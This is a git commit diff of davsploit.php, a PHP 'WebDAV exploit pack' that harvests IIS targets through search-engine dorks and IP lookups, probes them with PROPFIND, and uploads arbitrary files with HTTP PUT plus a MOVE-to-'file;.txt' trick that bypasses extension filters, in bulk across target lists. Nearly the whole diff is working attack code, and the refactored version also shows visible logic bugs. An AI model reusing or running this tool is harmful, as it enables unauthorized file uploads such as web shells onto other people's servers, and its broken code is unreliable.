0fdf4d58ad008c48598451eb595f742d1013c554
Mokhdzani Faeq <mokhdzani.faeq@gmail.com>
2013-12-14 19:57:54 +0800

    major code cleanup

--- davsploit.php
+++ davsploit.php
@@ -2,200 +2,95 @@
 set_time_limit(0);
 error_reporting(0);
 
-echo "             
+echo '            
   _________  ____    __         _       ___   
   \_   __  \/  \ \  / /__ ____ | | ___ |_| |_ 
     | |  / / /\ \ \/ / __/  _ \| |/ _ \| |  _\ 
     | |_/ / /__\ \  /__  | | | | | |_| | | |___
     |____/________\/____/| ||_/|_|\___/|_|_____\
-    -------------------- |_| -------------------
+    -------------------- |_| -------------------  
 
-    WebDAV exploit pack - coded by pers0nant	  
+';
 
-";
+$arg = getopt('', array('url:', 'multi:', 'server:', 'upload:', 'valid', 'dork:', 'nolog'));
 
-$arg = getopt("", array("url:", "multi:", "server:", "upload:", "valid", "dork:"));
-
-if(isset($arg["url"])) {
-
-
-
-	if(!check_url($arg["url"])) die("    [*] URL is not valid\r\n\r\n\r\n");
-	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("    [*] cannot determine attack vector\r\n\r\n\r\n");
+if(isset($arg['url'])) {
 	
-	if(preg_match("/https?/", $arg["url"])) $url = preg_replace("/https?:\/\//", "", $arg["url"]);
-	else $url = $arg["url"];
-
-	if(isset($arg["upload"])) {
+	vector();
 	
-		if(!is_file($arg["upload"])) die("    [*] cannot find ".$arg["upload"]."\r\n\r\n\r\n");
-		
-		$filename = bypass($arg["upload"]);
-			
-		if(put($url, $arg["upload"])) echo "    [!] ".$filename." was successfully uploaded\r\n";
-		else echo "    [x] failed to upload ".basename($arg["upload"])."\r\n";
-	
-	} elseif(isset($arg["valid"])) {
-	
-		if(propfind($url)) die("    [!] ".$arg["url"]." is possibly vulnerable\r\n\r\n\r\n");
-		else die("    [x] ".$arg["url"]." is not vulnerable\r\n\r\n\r\n");
-		
-	}
+	$url = preg_replace('#https?://#', '', $arg['url']);
 
+	if(isset($arg['upload'])) upload($url, $arg['upload']);
+	if(isset($arg['valid'])) valid($url);
 
-
-} elseif(isset($arg["multi"])) {
-
-
+} elseif(isset($arg['multi'])) {
 	
-	if(!is_file($arg["multi"])) die("    [*] cannot find ".$arg["multi"]."\r\n\r\n\r\n");
-	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("   [*] cannot determine attack vector\r\n\r\n\r\n");
+	vector();
 
-	$list = array_filter(file($arg["multi"], FILE_IGNORE_NEW_LINES), function($x){ return is_string($x) && trim($x) !== ""; });
-	array_unique($list);
-		
-	if(count($list) !== 0) echo "    [*] ".count($list)." URLs loaded\r\n\r\n";
-	else die("    [x] no URLs retrieved\r\n\r\n\r\n");
+	if(!is_file($arg['multi'])) die('    [!] cannot find' . $arg['multi'] . "\n\n\n");
 
-	if(isset($arg["upload"])) {
-	
-		if(!is_file($arg["upload"])) die("    [*] cannot find ".$arg["upload"]."\r\n\r\n\r\n");
-				
-		$filename = bypass($arg["upload"]);
-		
-		foreach($list as $url) {
-		
-			$site = clean($url);
-	
-			if(put($site, $arg["upload"])) echo "    [!] ".$site."\r\n";
-			else echo "    [x] ".$site."\r\n";
+	$list = listfunc(file($arg['multi'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
 
-		}
-	
-	} elseif(isset($arg["valid"])) {
-	
-		foreach($list as $url) {
-		
-			$site = clean($url);
-	
-			if(propfind($site)) echo "    [!] ".$site."\r\n";
-			else echo "    [x] ".$site."\r\n";
-	
-		}
-	
-	}
-
-
+	if(isset($arg['upload'])) upload($list, $arg['upload']);
+	if(isset($arg['valid'])) valid($list);
 
 } elseif(isset($arg[server])) {
 
+	vector();
 
-	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("   [*] cannot determine attack vector\r\n\r\n\r\n");
-
-	if(filter_var($arg[server], FILTER_VALIDATE_IP)) {
-
-		$ip = $arg[server];
-		
-	} else {
+	if(filter_var($arg[server], FILTER_VALIDATE_IP)) $ip = $arg[server];
+	else {
 
 		$site = preg_replace("/http:\/\//", "", $arg[server]);
 		$ip = gethostbyname($site);
 		
-		if(!filter_var($ip, FILTER_VALIDATE_IP)) die("    [*] cannot retrieve server ip address\r\n\r\n\r\n");
-
-	}
-			
-	echo "    [*] ip address : ".$ip."\r\n\r\n";
-
-	// IP LOGGING ///////////////////////////////////////////////////////////////////////
-	
-	if(preg_match('/'.str_replace('.', '\.', $ip).'/', file_get_contents("ip.txt"))) {
-	
-		echo "    [*] the server had been scanned before. continue? (y/n) ";
-		$input = trim(fgets(STDIN));
-		echo "\r\n\r\n";
-		
-		if(!preg_match('/(y|yes)/i', $input)) exit; 
-	
-	} else append($ip."\r\n", "ip.txt");
-
-	/////////////////////////////////////////////////////////////////////////////////////
-	
-	$list = dork("yahoo", "ip:".$ip);
-	
-	if(isset($arg["valid"])) {
-	
-		if(propfind($list[0])) die("    [!] the server is vulnerable\r\n\r\n\r\n");
-		else die("    [x] the server is not vulnerable\r\n\r\n\r\n");
-	
-	}
-	
-	if(count($list) !== 0) echo "    [*] ".count($list)." URLs loaded\r\n\r\n";
-	else die("    [x] no URLs retrieved\r\n\r\n\r\n");
-	
-	if(isset($arg["upload"])) {
-	
-		if(!is_file($arg["upload"])) die("    [*] cannot find ".$arg["upload"]."\r\n\r\n\r\n");
-		
-		$filename = bypass($arg["upload"]);
-			
-		foreach($list as $url) {
-		
-			if(put($url, $arg["upload"])) echo "    [!] ".$url."\r\n";
-			else echo "    [x] ".$url."\r\n";
-		
-		}	
+		if(!filter_var($ip, FILTER_VALIDATE_IP)) die('    [*] cannot retrieve server ip address' . "\n\n\n");
 
 	}
 
-
+	echo '    [*] ip address : ' . $ip . "\n\n";
 	
-} elseif(isset($arg["dork"])) {
-
-
-
-	$exp = explode(",", $arg["dork"]);
-
-	if(!isset($exp[1])) die("   [*] invalid dork argument\r\n\r\n");
-	if(!preg_match('/(ask|bing|conduit|yahoo)/', $exp[0])) die("   [*] invalid dork engine\r\n\r\n");
-	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("   [*] cannot determine attack vector\r\n\r\n\r\n");
-
-	$list = dork($exp[0], $exp[1]);
-	array_unique($list);
+	$list = listfunc(dork('yahoo', 'ip:' . $ip));
 	
-	if(count($list) !== 0) echo "    [*] ".count($list)." URLs loaded\r\n\r\n";
-	else die("    [x] no URLs retrieved\r\n\r\n\r\n");
+	if(isset($arg['valid'])) valid($list[0], 1);
 	
-	if(isset($arg["upload"])) {
-	
-		if(!is_file($arg["upload"])) die("    [*] cannot find ".$arg["upload"]."\r\n\r\n\r\n");
-		
-		$filename = bypass($arg["upload"]);
+	if(isset($arg['upload'])) {
+
+		if(!isset($arg['nolog'])) {
+
+			if(in_array($ip, file('ip.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES))) {
 			
-		foreach($list as $url) {
-		
-			if(put($url, $arg["upload"])) echo "    [!] ".$url."\r\n";
-			else echo "    [x] ".$url."\r\n";
-		
+				echo '    [*] the server had been scanned before. continue? (y/n) ';
+				$input = trim(fgets(STDIN));
+				echo "\n\n";
+				
+				if(!preg_match('#(y|yes)#i', $input)) exit;
+			
+			} else file_put_contents('ip.txt', $ip . "\n", FILE_APPEND);
+
 		}
-	
-	} elseif(isset($arg["valid"])) {
-	
-		foreach($list as $url) {
-		
-			if(propfind($url)) echo "    [!] ".$url."\r\n";
-			else echo "    [x] ".$url."\r\n";
-		
-		}
-	
+
+		upload($list, $arg['upload']);
+
 	}
+	
+} elseif(isset($arg['dork'])) {
 
+	vector();
 
+	$exp = explode(',', $arg['dork']);
+
+	if(!isset($exp[1])) die('   [!] invalid dork argument' . "\n\n");
+	if(!preg_match('#(ask|bing|conduit|yahoo)#i', $exp[0])) die('   [!] invalid dork engine' . "\n\n");
+
+	$list = listfunc(dork($exp[0], $exp[1]));
+	
+	if(isset($arg['upload'])) upload($list, $arg['upload']);
+	if(isset($arg['valid'])) valid($list);
 
 } else {
 
-
-	echo "    DAVsploit is an automated exploit pack created to pentest WebDAV enabled 
+	echo '    DAVsploit is an automated exploit pack created to pentest WebDAV enabled 
     
     IIS server(s) by performing remote authentication attacks
         
@@ -211,8 +106,13 @@ if(isset($arg["url"])) {
     attack vector :	
 		
         --upload [FILE]          upload file to server (extension bypass)
-        --valid                  scan for webDAV possible vulnerability
-	  
+        --valid                  scan for webDAV possible vulnerability	 
+
+
+    special :
+
+        --nolog                  do not keep log of the ip address 
+
 
     engine (dork usage) :
 	
@@ -224,36 +124,115 @@ if(isset($arg["url"])) {
 
     example:
 
-        php ".$argv[0]." --url site.com --upload x.html
-        php ".$argv[0]." --multi list.txt --valid
-        php ".$argv[0]." --server 127.0.0.1 --upload x.txt
-        php ".$argv[0]." --dork conduit,inurl:asp --valid \r\n";
+        php ' . $argv[0] . ' --url site.com --upload x.html
+        php ' . $argv[0] . ' --multi list.txt --valid
+        php ' . $argv[0] . ' --server 127.0.0.1 --upload x.txt
+        php ' . $argv[0] . ' --dork conduit,inurl:asp --valid';
 
 }
 
-echo "\r\n\r\n";
+echo "\n\n";
 exit;
 
-function get_source($url) {
+function listfunc($list) {
 
-	$curl = curl_init($url);
-	curl_setopt ($curl, CURLOPT_HEADER, 0);
-	curl_setopt ($curl, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt ($curl, CURLOPT_FOLLOWLOCATION, 1);
-	curl_setopt ($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0");
-	$source = curl_exec ($curl);
-	curl_close ($curl);
-	return $source;
+	array_unique($list);
+
+	if(count($list) !== 0) echo '    [*] ' . count($list) . ' URLs loaded' . "\n\n";
+	else die('    [!] no URLs retrieved' . "\n\n\n");
+
+	return $list;
+
+}
+
+function vector() {
+
+	if(!isset($arg['valid']) AND !isset($arg['upload'])) die('    [!] cannot determine attack vector' . "\n\n\n");
+
+}
+
+function upload($urls, $file) {
+
+	if(!is_file($file)) die('    [!] cannot find ' . $file . "\n\n\n");
+
+	$filename = basename($file);
+	$exp = explode('.', $filename);
+	$size = filesize($file);
+	$fh = fopen($file, "r");
+	$bypass = false;
 	
+	if($exp[1] !== 'txt' && $exp[1] !== 'htm' && $exp[1] !== 'html') {
+
+		echo '    [*] the file will be uploaded as ' . $filename . ';.txt' . "\n\n";
+		
+		$filename =  $filename . ';.txt';
+		$bypass = true;
+
+	}
+
+	foreach ((array)$urls as $url) {
+		
+		$putopts = array(
+
+			CURLOPT_URL => $url . '/' . $exp[0] . ($bypass ? '.txt' : $exp[1]),
+			CURLOPT_UPLOAD => true,
+			CURLOPT_PUT => true,
+			CURLOPT_INFILE => $fh,
+			CURLOPT_INFILESIZE => $size
+
+			);
+
+		if(curlRequest($putopts, '#(ok|created)#i')) {
+
+			if($bypass) {
+
+				$moveopts = array(
+
+						CURLOPT_URL => $url . '/' . $exp[0] . '.txt',
+						CURLOPT_CUSTOMREQUEST => 'MOVE',
+						CURLOPT_HTTPHEADER => array('Destination: http://' . $url . '/' . $filename)
+
+					);
+						
+				$response = curlRequest($moveopts, '#(created|no content)#i') ? true : false;
+							
+			} else $response = true;
+
+		} else $response = false;
+
+		if($response) echo '    [+] ' . $filename . ' was successfully uploaded' . "\n";
+		else echo '   [-] failed to upload ' . basename($file) . "\n";
+ 
+	}
+
+}
+
+function valid($urls, $server = false) {
+
+	foreach((array)$urls as $url) {
+
+		$opts = array(
+
+			CURLOPT_URL => $url,
+			CURLOPT_CUSTOMREQUEST => 'PROPFIND',
+			CURLOPT_HTTPHEADER => array('Content-Type: txt/xml', 'Content-Length: 0')
+
+			);
+
+		if(curlRequest($opts, '#multi-status#i')) die('    [+] ' . $server ? 'server' : $url . ' is possibly vulnerable ' . "\n\n\n");
+		else die('    [-] ' . $server ? 'server' : $url . ' is not vulnerable' . "\n\n\n");
+
+	}
+
 }
 
 function clean($url) {
 
 	$url = preg_replace('/https?:\/\//', '', $url);
 
-	if(preg_match('/\//', $url)) {
+	if(stripos('/', $url) !== false) {
 
-		$exp = explode("/", $url);
+		$exp = explode('/', $url);
 		return $exp[0];
 
 	} else return $url; 
@@ -263,7 +242,7 @@ function clean($url) {
 function yclean($url) {
 
 	$exp = explode('**', $url);
-	$lode = explode("/", urldecode($exp[1]));
+	$lode = explode('/', urldecode($exp[1]));
 	return $lode[2];
 
 }
@@ -273,50 +252,45 @@ function dork($engine, $dork) {
 	$dork = urlencode(stripslashes($dork));
 	$urls = array();
 	
-	if($engine === "ask") {
+	if($engine == 'ask') {
 
-		$search = "http://www.ask.com/web?q=";
-		$page = "&page=";
-		$regex = '/<a id="r[0-9]_t" href="(.*)" onmousedown="return/';
-		$next = '/class="pgnav fl"><a class="/';
+		$search = 'http://www.ask.com/web?q=';
+		$page = '&page=';
+		$regex = '#class="url txt_lg" href="([^"]+)"#';
+		$next = '/>Next&#160;&#187;/';
 		$start = 1;
 	
-	} elseif($engine === "conduit"){
+	} elseif($engine === 'conduit'){
 
-		$search = "http://search.conduit.com/Results.aspx?q=";
-		$page = "&start=";
-		$regex = '/<div class="title"><a href="(.*)" id="/';
-		$next = '/Next <span class="paging_icon next">/';
+		$search = 'http://search.conduit.com/Results.aspx?q=';
+		$page = '&start=';
+		$regex = '#<div class="title"><a href="([^"]+)"#';
+		$next = '#Next <span class="paging_icon next">#';
 		$start = 0;
 
-	} elseif($engine === "bing") {
+	} elseif($engine === 'bing') {
 
-		$search = "http://www.bing.com/search?q=";
-		$page = "&first=";	
-		$regex = '(<div class="sb_tlst">.*<h3>.*<a href="(.*)".*>(.*)</a>.*</h3>.*</div>)siU';
-		$next = '/Next<\/a><\/li><\/ul>/';
+		$search = 'http://www.bing.com/search?q=';
+		$page = '&first=';	
+		$regex = '#<div class="sb_tlst"><h3><a href="([^"]+)"#';
+		$next = '#Next</a></li></ul>#';
 		$start = 0;
 	
-	} elseif($engine === "yahoo") {
+	} elseif($engine === 'yahoo') {
 	
-		$search = "http://search.yahoo.com/search?p=";
-		$page = "&b=";	
-		$regex = '/class="yschttl spt" href="(.*?)"target="_blank" data-bk="/si';
-		$next = '/Next &gt;<\/a><\/div><\/div>/';
+		$search = 'http://search.yahoo.com/search?p=';
+		$page = '&b=';	
+		$regex = '#class="yschttl spt" href="([^"]+)"#';
+		$next = '#Next</a><span>#';
 		$start = 0;
 	
 	}
 	
-	for($id = $start ; $id <= 999; $id++) {
+	for($id = $start ;; $id++) {
 		
-		if($engine !== "ask") {
+		$id = $engine == 'ask' ?: $id = $id * 10 + 1;
 		
-			$id = $id * 10;
-			$id = $id + 1;
-			
-		}
-		
-		$result = get_source($search.$dork.$page.$id);
+		$result = file_get_contents($search . $dork . $page . $id);
 		preg_match_all($regex, $result, $matches);
 		
 		foreach($matches[1] as $site) {
@@ -334,115 +308,26 @@ function dork($engine, $dork) {
 
 }
 
-function put($url, $file) {
-
-	$ch = curl_init();
-	$base = basename($file);
-	$exp = explode(".", $base);
-	$filesize = filesize($file);
-	$fh = fopen($file, "r");
-
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-	curl_setopt($ch, CURLOPT_URL, $url."/".$exp[0].".txt");
-	curl_setopt($ch, CURLOPT_HEADER, 1);
-	curl_setopt($ch, CURLOPT_NOBODY, 1);
-	curl_setopt($ch, CURLOPT_UPLOAD, 1);
-	curl_setopt($ch, CURLOPT_PUT, 1);
-	curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 10);
-	curl_setopt($c, CURLOPT_TIMEOUT, 10);
-	curl_setopt($ch, CURLOPT_INFILE, $fh);
-	curl_setopt($ch, CURLOPT_INFILESIZE, $filesize);
-	$res = curl_exec($ch);
-	curl_close($ch);
-	fclose($fh);
-
-	if(preg_match("/(OK|Created)/", $res)) {
-		
-		if($exp[1] !== "htm" && $exp[1] !== "html" && $exp[1] !== "txt") {
-					
-			if(move($url, $exp[0], $base)) return TRUE;
-			else return FALSE;
-						
-		} else return TRUE;
-				
-	} else return FALSE;
-
-}
-
-function move($url, $base, $file) {
+function curlRequest($options, $pattern) {
 
 	$c = curl_init();
-	curl_setopt($c, CURLOPT_URL, $url."/".$base.".txt");
-	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($c, CURLOPT_CUSTOMREQUEST, "MOVE");
-	curl_setopt($c, CURLOPT_HEADER, 1);
-	curl_setopt($c, CURLOPT_NOBODY, 1);
-	curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 10);
-	curl_setopt($c, CURLOPT_TIMEOUT, 10);
-	curl_setopt($c, CURLOPT_HTTPHEADER, array("Destination: http://".$url."/".$file.";.txt"));
+
+	$general =  array(
+
+		CURLOPT_RETURNTRANSFER => true,
+		CURLOPT_HEADER => true,
+		CURLOPT_NOBODY => true,
+		CURLOPT_CONNECTTIMEOUT => 10,
+		CURLOPT_TIMEOUT => 10
+
+		);
+
+	curl_setopt_array($c, $general + $options);
 	$response = curl_exec($c);
 	curl_close($c);
-	
-	if(preg_match("/(Created|No Content)/", $response)) return TRUE;
-	else return FALSE;
 
-}
+	return preg_match($pattern, $response) ? true : false;
 
-function propfind($url) {
-
-	$c = curl_init();
-	curl_setopt($c, CURLOPT_URL, $url);
-	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($c, CURLOPT_CUSTOMREQUEST, "PROPFIND");
-	curl_setopt($c, CURLOPT_HEADER, 1);
-	curl_setopt($c, CURLOPT_NOBODY, 1);
-	curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 10);
-	curl_setopt($c, CURLOPT_TIMEOUT, 10);
-	curl_setopt($c, CURLOPT_HTTPHEADER, array("Content-Type: txt/xml", "Content-Length: 0"));  
-	$res = curl_exec( $c );
-
-	if(preg_match("/Multi-Status/", $res) AND preg_match("/Microsoft-IIS\/(6|5)/", $res)) return TRUE;
-	else return FALSE;
-
-}
-
-function check_url($url) {
-
-	$curl = curl_init($url);
-	curl_setopt($curl, CURLOPT_NOBODY, 1);
-	$result = curl_exec($curl);
-    
-	if($result) {
-    
-		$code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
-		return ($code == 200 ? TRUE : FALSE);
-        
-	} else return FALSE;
-	
-}
-
-function append($str, $file) {
-
-	if(!is_file($file)) $f = fopen($file, "w");
-	else $f = fopen($file, "a");
-	
-    fwrite($f, $str);
-    fclose($f);
-
-}
-
-function bypass($file) {
-
-	$base = basename($file);
-	$exp = explode(".", $base);
-	
-	if($exp[1] !== "txt" && $exp[1] !== "htm" && $exp[1] !== "html") {
-
-		echo "    [*] the file will be uploaded as ".$base.";.txt\r\n\r\n";
-		return $base.";.txt";
-
-	} else return $base;
-	
 }
 
 ?>
